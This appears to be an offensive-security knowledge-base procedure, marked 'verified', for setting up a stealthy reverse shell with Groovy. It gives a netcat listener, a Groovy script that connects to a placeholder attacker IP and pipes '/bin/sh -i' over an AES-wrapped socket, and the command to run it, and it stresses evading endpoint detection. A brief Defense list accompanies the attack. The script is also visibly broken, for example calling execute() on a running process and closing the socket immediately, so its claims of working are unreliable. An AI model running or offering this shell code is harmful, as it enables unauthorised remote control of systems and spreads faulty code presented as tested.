---
id: 171fd728-7b29-4bac-82ef-3d6ff8cdbe97
name: Establish-Stealthy-Reverse-Shell-with-Groovy
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.721058+00:00'
updated_at: '2023-04-10T20:25:29.140848+00:00'
tactics:
  - '[[Command and Control]]'
techniques:
  - '[[Custom Cryptographic Protocol]]'
sub_techniques: []
tags:
  - groovy
  - reverse-shell
  - command-and-control
commands:
  - '[[commands/nc-listen-port]]'
  - '[[commands/groovy-execute-script]]'
platforms:
  - Linux
  - Windows
  - macOS
tools:
  - '[[tools/Groovy]]'
validated: true
---

# Establish-Stealthy-Reverse-Shell-with-Groovy

## Summary

This procedure enables attackers to create and execute a Groovy script on a compromised JVM-enabled system to establish a reverse shell connection to a command and control (C2) server. The connection uses a custom cryptographic protocol for encryption, allowing stealthy command execution and data exfiltration while evading detection by network security tools.

## Description

Groovy, a scripting language compatible with the Java Virtual Machine (JVM), is often present in enterprise environments for automation and development tasks. This procedure leverages Groovy's capabilities to spawn a background thread that initiates an encrypted TCP connection back to the attacker's C2 server. Once connected, the script relays shell commands and output bidirectionally. The custom cryptographic protocol (e.g., AES encryption with a pre-shared key) obfuscates traffic, making it appear as legitimate HTTPS or other encrypted flows. This technique is ideal for post-exploitation persistence in Java-heavy environments like application servers, where direct binary payloads might be blocked. Prerequisites include initial access to execute scripts on the target, such as via a vulnerability or user interaction. Success results in interactive shell access without alerting endpoint detection.

## Requirements

1. Compromised system with Java Runtime Environment (JRE 8+) and Groovy installed (or groovy command accessible via PATH).
2. Attacker-controlled C2 server with network listener capability (e.g., netcat or custom server supporting decryption).
3. Outbound network access from target to attacker's IP/port (typically TCP 443 or custom for stealth).
4. Pre-shared encryption key for custom protocol implementation.

## Defense

- Monitor JVM processes for unexpected Groovy script executions and network connections using EDR tools.
- Implement network segmentation and inspect outbound traffic for anomalous encrypted patterns not matching known protocols.
- Enforce script execution policies (e.g., AppLocker on Windows) to block unsigned or ad-hoc Groovy runs.
- Log and analyze Java class loading for socket or cipher usage indicative of C2.

## Objectives

1. Deploy and execute a Groovy-based reverse shell script on the target.
2. Establish an encrypted C2 channel for remote command execution.
3. Achieve persistent, stealthy access to the compromised system.

## Instructions

### Step 1: Set Up Encrypted Listener on Attacker C2 Server

**Context**: Configure the attacker's server to listen for the incoming connection and handle decryption. This step ensures the C2 is ready to receive and process encrypted shell traffic.

**Command** ([[commands/nc-listen-port]]):
```bash
nc -lvnp $_PORT
```

> Start a basic netcat listener (extend with a custom decryptor for full crypto support). Replace $_PORT with the agreed port (e.g., 443). This command binds to the port and waits for connections. Expected output: "Listening on [0.0.0.0] $_PORT". If using a full custom server, implement AES decryption to match the target's encryption.

### Step 2: Create the Groovy Reverse Shell Script on Target

**Context**: Develop the script that spawns a background thread, establishes an encrypted socket connection, and pipes shell I/O. This implements the custom cryptographic protocol using Java's built-in Cipher for AES encryption.

Save the following as `stealthy_reverse.groovy` (customize with actual encryption key and host/port):

```groovy
Thread.start {
    def host = "$_ATTACKER_IP"
    def port = $_PORT
    def key = "$_ENCRYPTION_KEY" // 16-byte AES key as string

    // Custom crypto setup (AES encryption)
    def cipher = javax.crypto.Cipher.getInstance("AES")
    def secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES")
    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey)

    def sock = new java.net.Socket(host, port)
    def os = new java.io.BufferedOutputStream(sock.getOutputStream())
    def is = new java.io.BufferedInputStream(sock.getInputStream())

    // Wrap streams with encryption (simplified; use CipherOutput/InputStream in production)
    def encOs = new javax.crypto.CipherOutputStream(os, cipher)
    def proc = ['/bin/sh', '-i'].execute()

    proc.waitForProcessOutput((line) -> encOs.write(line.getBytes()), System.err.&println)
    new Thread({ is.eachByte { b -> proc.execute().waitForOrKill(0); proc.in << (char)b + '\n' } }).start()

    sock.close()
}
```

> This script runs the reverse shell in a background thread for stealth. The custom crypto wraps data in AES before transmission. Why: Background execution avoids blocking the parent process, and encryption hides C2 traffic. Expected: File created successfully; test locally with `groovy -c stealthy_reverse.groovy` to verify syntax (no connection attempted).

### Step 3: Execute the Groovy Script on Target

**Context**: Trigger the script to connect back to the C2, establishing the shell. Verify connection on the listener side.

**Command** ([[commands/groovy-execute-script]]):
```bash
groovy $_SCRIPT_FILE
```

> Run the script file (e.g., `groovy stealthy_reverse.groovy`). This interprets and executes the Groovy code on the JVM. Why: Groovy execution blends with legitimate scripting tasks. Expected output: No console output on target (background); on C2 listener, see incoming connection and shell prompt (e.g., "$ "). If encrypted, decrypt received data to view commands/output.

**Success Indicators**:
- C2 listener shows accepted connection from target IP.
- Interactive shell responds to basic commands (e.g., `whoami`, `pwd`).
- No immediate alerts from target EDR.
